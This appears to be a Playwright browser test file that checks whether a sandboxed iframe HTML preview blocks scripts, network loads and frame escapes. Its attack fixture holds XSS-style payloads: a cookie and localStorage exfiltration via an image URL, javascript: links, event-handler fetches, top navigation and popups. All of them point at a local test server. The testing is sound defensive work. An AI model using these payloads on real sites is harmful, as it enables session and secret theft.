/**
 * Browser-level tests for read-only HTML previews, in real Chromium (Playwright).
 *
 * A local server plays the app: it serves a parent page that holds app state (a
 * DOM probe, a `window` marker, a `localStorage` secret, a cookie) and embeds a
 * document exactly as `HtmlPreviewPane` does — an iframe with the real
 * `HTML_PREVIEW_SANDBOX` and a `srcdoc` from the real `buildSandboxedSrcdoc`.
 * Every other request the server sees is logged, so "no network" is measured,
 * not assumed. Kept out of `npm test`: run `npm run test:browser`.
 */
import http from 'node:http';
import type { AddressInfo } from 'node:net';

import { JSDOM } from 'jsdom';
import { chromium, type Browser, type BrowserContext, type Frame, type Page } from 'playwright';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';

import { buildSandboxedSrcdoc, HTML_PREVIEW_CSP, HTML_PREVIEW_SANDBOX } from '../src/html/sandbox';

// The builder runs in Node here, so hand it jsdom's (inert) HTML parser.
const parser = new new JSDOM('').window.DOMParser();
const build = (source: string) => buildSandboxedSrcdoc(source, parser);

let browser: Browser;
let server: http.Server;
let origin = '';
let parentHtml = '';
let parentLoads = 0;
const requests: string[] = [];

beforeAll(async () => {
  server = http.createServer((req, res) => {
    if (req.url === '/parent' && req.headers['sec-fetch-dest'] === 'document') {
      parentLoads += 1;
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      res.end(parentHtml);
      return;
    }
    requests.push(`${req.method} ${req.url} (${req.headers['sec-fetch-dest'] ?? '?'})`);
    if (req.url?.startsWith('/api/')) {
      // A stand-in for the vault API a script would try to reach.
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: true, data: [{ name: 'secret.md', path: 'secret.md' }] }));
      return;
    }
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('ok');
  });
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  origin = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
  browser = await chromium.launch();
});

afterAll(async () => {
  await browser?.close();
  await new Promise<void>((resolve) => server?.close(() => resolve()));
});

const escapeAttribute = (value: string) => value.replace(/&/g, '&amp;').replace(/"/g, '&quot;');

/** The "app": state worth stealing, plus the preview frame set up like the real pane. */
function parentPage(srcdoc: string): string {
  return `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Preview host</title>
<link rel="icon" href="data:,">
<style>
  :root { color-scheme: dark; }
  @media (prefers-color-scheme: light) { :root { color-scheme: light; } }
  body { margin: 0; font-family: monospace; }
  #probe { color: rgb(1, 2, 3); background-color: rgb(4, 5, 6); font-family: monospace; }
  iframe { display: block; width: 900px; height: 600px; border: 0; background: Canvas; }
</style>
</head>
<body>
<div id="probe">app state</div>
<iframe id="doc" title="HTML preview" sandbox="${HTML_PREVIEW_SANDBOX}" referrerpolicy="no-referrer" srcdoc="${escapeAttribute(srcdoc)}"></iframe>
<script>
  localStorage.setItem('secret', 'parent-secret');
  document.cookie = 'session=parent-cookie; path=/';
  window.__swapDocument = (next) => document.getElementById('doc').setAttribute('srcdoc', next);
</script>
</body>
</html>`;
}

interface Harness {
  context: BrowserContext;
  page: Page;
  frame: () => Frame;
  popups: string[];
  dialogs: string[];
}

async function openPreview(
  srcdoc: string,
  colorScheme: 'light' | 'dark' = 'dark',
): Promise<Harness> {
  requests.length = 0;
  parentLoads = 0;
  parentHtml = parentPage(srcdoc);

  const context = await browser.newContext({ colorScheme });
  const page = await context.newPage();
  // Registered after the initial page exists, so only *new* pages count.
  const popups: string[] = [];
  context.on('page', (popup) => popups.push(popup.url()));
  const dialogs: string[] = [];
  page.on('dialog', (dialog) => {
    dialogs.push(dialog.message());
    void dialog.dismiss();
  });

  await page.goto(`${origin}/parent`);
  await page.frameLocator('#doc').locator('body').waitFor({ state: 'attached' });
  // Set after load: a reload or navigation of the app page would wipe it.
  await page.evaluate(() => {
    (window as unknown as { __marker: string }).__marker = 'untouched';
  });
  const frame = () => {
    const child = page.frames().find((candidate) => candidate !== page.mainFrame());
    if (!child) {
      throw new Error('preview frame is gone');
    }
    return child;
  };
  return { context, page, frame, popups, dialogs };
}

/** Let anything asynchronous (late loads, refreshes, popups) surface before asserting. */
const settle = (page: Page, ms = 600) => page.waitForTimeout(ms);

async function expectAppUntouched({ page, frame, popups, dialogs }: Harness): Promise<void> {
  expect(requests).toEqual([]);
  expect(parentLoads).toBe(1);
  expect(page.url()).toBe(`${origin}/parent`);
  expect(await page.evaluate(() => (window as unknown as { __marker?: string }).__marker)).toBe(
    'untouched',
  );
  expect(await page.textContent('#probe')).toBe('app state');
  expect(await page.getAttribute('#doc', 'sandbox')).toBe('');
  expect(popups).toEqual([]);
  expect(page.context().pages()).toHaveLength(1);
  expect(dialogs).toEqual([]);
  expect(frame().url()).toMatch(/^about:srcdoc(#.*)?$/);
}

/** Probes run from inside the frame (Playwright's utility world). */
async function frameIsolation(frame: Frame) {
  return frame.evaluate(() => {
    const attempt = (fn: () => unknown) => {
      try {
        fn();
        return 'allowed';
      } catch (error) {
        return (error as Error).name;
      }
    };
    return {
      origin: self.origin,
      parentDocument: attempt(() => window.parent.document.body),
      topDocument: attempt(() => window.top?.document.body),
      localStorage: attempt(() => window.localStorage.length),
      sessionStorage: attempt(() => window.sessionStorage.length),
      cookie: attempt(() => document.cookie),
      scriptMarkers: [
        document.documentElement.dataset.pwned,
        document.body.dataset.pwned,
        document.body.dataset.clicked,
      ].filter(Boolean),
    };
  });
}

/** Every way we know for a document to run code, phone home, or escape its frame. */
function attackDocument(): string {
  const at = origin;
  return `<!DOCTYPE html>
<html>
<head>
<base href="${at}/x-author-base/" target="_top">
<meta http-equiv="refresh" content="0;url=${at}/x-meta-refresh">
<link rel="stylesheet" href="${at}/x-link-stylesheet">
<link rel="prefetch" href="${at}/x-link-prefetch">
<link rel="preload" as="image" href="${at}/x-link-preload">
<link rel="icon" href="${at}/x-link-icon">
<style>
  @import url('${at}/x-css-import');
  .bg { background-image: url('${at}/x-css-background'); }
  @font-face { font-family: Leak; src: url('${at}/x-css-font'); }
  .font { font-family: Leak; }
</style>
<script>
  document.documentElement.dataset.pwned = 'script';
  try { parent.document.getElementById('probe').textContent = 'pwned'; } catch (e) {}
  try { top.location = '${at}/x-top-location'; } catch (e) {}
  fetch('/api/tree');
  fetch('${at}/api/tree');
  try { new Image().src = '${at}/x-exfiltrate?' + localStorage.getItem('secret') + document.cookie; } catch (e) {}
  try { window.open('${at}/x-window-open'); } catch (e) {}
  alert('alert from the document');
</script>
<script type="module">import '${at}/x-module';</script>
</head>
<body background="${at}/x-body-background" onload="document.body.dataset.pwned = 'onload'">
<h1 id="title">Attack fixture</h1>
<img src="${at}/x-img" alt="">
<img src="data:," onerror="document.body.dataset.pwned = 'onerror'; fetch('${at}/x-onerror')" alt="">
<img srcset="${at}/x-srcset 2x" alt="">
<picture><source srcset="${at}/x-picture-source"><img alt=""></picture>
<input type="image" src="${at}/x-input-image" alt="go">
<div class="bg font">background + font</div>
<iframe src="${at}/x-iframe"></iframe>
<iframe srcdoc="<img src='${at}/x-nested-srcdoc-img'>"></iframe>
<object data="${at}/x-object"></object>
<embed src="${at}/x-embed">
<video src="${at}/x-video" autoplay muted></video>
<audio src="${at}/x-audio" autoplay></audio>
<svg width="20" height="20"><image href="${at}/x-svg-image" width="10" height="10"/><use href="${at}/x-svg-use#a"/></svg>
<form id="form" action="${at}/x-form" method="post"><input name="q" value="secret"><button id="submit" type="submit">Submit</button></form>
<p>
<a id="link-top" href="${at}/x-link-top" target="_top">top</a>
<a id="link-parent" href="${at}/x-link-parent" target="_parent">parent</a>
<a id="link-blank" href="${at}/x-link-blank" target="_blank">blank</a>
<a id="link-self" href="${at}/x-link-self" target="_self">self</a>
<a id="link-none" href="${at}/x-link-none">no target</a>
<a id="link-relative" href="x-link-relative">relative</a>
<a id="link-root-relative" href="/x-link-root-relative">root relative</a>
<a id="link-external" href="${at.replace('127.0.0.1', 'localhost')}/x-link-external">external</a>
<a id="link-javascript" href="javascript:fetch('${at}/x-javascript-url')">javascript</a>
<a id="link-ping" href="#section" ping="${at}/x-ping">ping</a>
<button id="handler" type="button" onclick="document.body.dataset.clicked = 'yes'; fetch('${at}/x-onclick')">handler</button>
</p>
<div><template shadowrootmode="open"><a id="link-shadow" href="${at}/x-shadow-link" target="_self">shadow</a><img src="${at}/x-shadow-img" alt=""></template></div>
<h2 id="section">Section</h2>
</body>
</html>`;
}

/** The browser layer alone: CSP + srcdoc base injected, author markup left as is. */
function withoutSanitizer(source: string): string {
  return source.replace(
    '<head>',
    `<head><meta http-equiv="Content-Security-Policy" content="${HTML_PREVIEW_CSP}"><base href="about:srcdoc" target="_blank">`,
  );
}

/** Click a control inside the preview, then give any consequence time to happen. */
async function clickInFrame(harness: Harness, selector: string): Promise<void> {
  await harness.page.frameLocator('#doc').locator(selector).click({ timeout: 10000 });
  await settle(harness.page, 150);
}

describe('sandboxed HTML preview — security (real Chromium)', () => {
  it('runs no script, loads nothing, and cannot escape — even when every control is clicked', async () => {
    const harness = await openPreview(build(attackDocument()));
    try {
      const preview = harness.page.frameLocator('#doc');
      await expect(preview.locator('#title').textContent()).resolves.toBe('Attack fixture');

      for (const selector of [
        '#submit',
        '#link-top',
        '#link-parent',
        '#link-blank',
        '#link-self',
        '#link-none',
        '#link-relative',
        '#link-root-relative',
        '#link-external',
        '#link-javascript',
        '#handler',
        '#link-shadow',
        '#link-ping',
      ]) {
        await clickInFrame(harness, selector);
      }
      await settle(harness.page);

      await expectAppUntouched(harness);
      expect(await frameIsolation(harness.frame())).toEqual({
        origin: 'null',
        parentDocument: 'SecurityError',
        topDocument: 'SecurityError',
        localStorage: 'SecurityError',
        sessionStorage: 'SecurityError',
        cookie: 'SecurityError',
        scriptMarkers: [],
      });
      // The author's form is still shown, it just can't go anywhere.
      await expect(preview.locator('#form input').inputValue()).resolves.toBe('secret');
    } finally {
      await harness.context.close();
    }
  });

  it('holds with the sanitiser bypassed: sandbox + CSP alone block scripts, loads, forms, popups, and escapes', async () => {
    // Defense in depth: the browser layer must hold on its own. Only explicit
    // `target="_self"` links (#link-self, #link-shadow) can navigate the frame
    // itself on a click; neutralising those is the sanitiser's one security
    // job, proven by the test above.
    const harness = await openPreview(withoutSanitizer(attackDocument()));
    try {
      await expect(harness.page.frameLocator('#doc').locator('#title').textContent()).resolves.toBe(
        'Attack fixture',
      );

      for (const selector of [
        '#submit',
        '#link-top',
        '#link-parent',
        '#link-blank',
        '#link-none',
        '#link-relative',
        '#link-root-relative',
        '#link-external',
        '#link-javascript',
        '#handler',
        '#link-ping',
      ]) {
        await clickInFrame(harness, selector);
      }
      await settle(harness.page);

      await expectAppUntouched(harness);
      expect(await frameIsolation(harness.frame())).toMatchObject({
        origin: 'null',
        parentDocument: 'SecurityError',
        localStorage: 'SecurityError',
        cookie: 'SecurityError',
        scriptMarkers: [],
      });
    } finally {
      await harness.context.close();
    }
  });
});

const REPORT_A = `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Report A</title>
<style>
  body { margin: 0; padding: 24px; background-color: rgb(16, 32, 48); color: rgb(240, 224, 208); font-family: Georgia, serif; }
  h1 { color: rgb(255, 196, 0); letter-spacing: 2px; }
  .card { border: 2px solid rgb(255, 196, 0); border-radius: 12px; padding: 16px; }
  /* Tries to restyle the app; must stay inside the frame. */
  #probe, body, * { font-family: Georgia, serif; }
  #probe { color: rgb(255, 0, 0) !important; background-color: rgb(0, 255, 0) !important; }
</style>
</head>
<body>
<h1 id="title">Quarterly report</h1>
<div class="card">Revenue up 12%</div>
<p><a id="jump" href="#details">Jump to details</a></p>
<div style="height: 2400px"></div>
<h2 id="details">Details</h2>
</body>
</html>`;

const REPORT_B = `<!DOCTYPE html>
<html>
<head>
<title>Report B</title>
<style>
  body { margin: 0; padding: 8px; background-color: rgb(250, 250, 245); color: rgb(20, 20, 20); font-family: 'Courier New', monospace; }
  h1 { color: rgb(0, 102, 204); }
</style>
</head>
<body><h1 id="title">Incident review</h1><p>Second document.</p></body>
</html>`;

async function computedStyles(frame: Frame) {
  return frame.evaluate(() => {
    const body = getComputedStyle(document.body);
    const title = document.getElementById('title');
    return {
      title: document.title,
      background: body.backgroundColor,
      color: body.color,
      font: body.fontFamily,
      heading: title ? getComputedStyle(title).color : null,
      cards: document.querySelectorAll('.card').length,
    };
  });
}

async function probeStyles(page: Page) {
  return page.$eval('#probe', (probe) => {
    const style = getComputedStyle(probe);
    return { color: style.color, background: style.backgroundColor, font: style.fontFamily };
  });
}

describe('sandboxed HTML preview — presentation (real Chromium)', () => {
  for (const colorScheme of ['light', 'dark'] as const) {
    it(`renders each document with its own styles and never leaks them (${colorScheme})`, async () => {
      const harness = await openPreview(build(REPORT_A), colorScheme);
      try {
        const probeBefore = await probeStyles(harness.page);
        expect(probeBefore).toEqual({
          color: 'rgb(1, 2, 3)',
          background: 'rgb(4, 5, 6)',
          font: 'monospace',
        });

        expect(await computedStyles(harness.frame())).toEqual({
          title: 'Report A',
          background: 'rgb(16, 32, 48)',
          color: 'rgb(240, 224, 208)',
          font: 'Georgia, serif',
          heading: 'rgb(255, 196, 0)',
          cards: 1,
        });
        expect(await probeStyles(harness.page)).toEqual(probeBefore);

        // In-page fragment links scroll the frame — no request, no navigation away.
        await harness.page.frameLocator('#doc').locator('#jump').click();
        await expect
          .poll(() => harness.frame().evaluate(() => window.scrollY))
          .toBeGreaterThan(1000);
        expect(harness.frame().url()).toBe('about:srcdoc#details');

        // Switching documents applies the second one's design and drops the first's.
        await harness.page.evaluate(
          (next) =>
            (window as unknown as { __swapDocument: (s: string) => void }).__swapDocument(next),
          build(REPORT_B),
        );
        await expect.poll(() => harness.frame().evaluate(() => document.title)).toBe('Report B');
        expect(await computedStyles(harness.frame())).toEqual({
          title: 'Report B',
          background: 'rgb(250, 250, 245)',
          color: 'rgb(20, 20, 20)',
          font: '"Courier New", monospace',
          heading: 'rgb(0, 102, 204)',
          cards: 0,
        });
        expect(await probeStyles(harness.page)).toEqual(probeBefore);

        await settle(harness.page, 200);
        await expectAppUntouched(harness);
      } finally {
        await harness.context.close();
      }
    });
  }
});
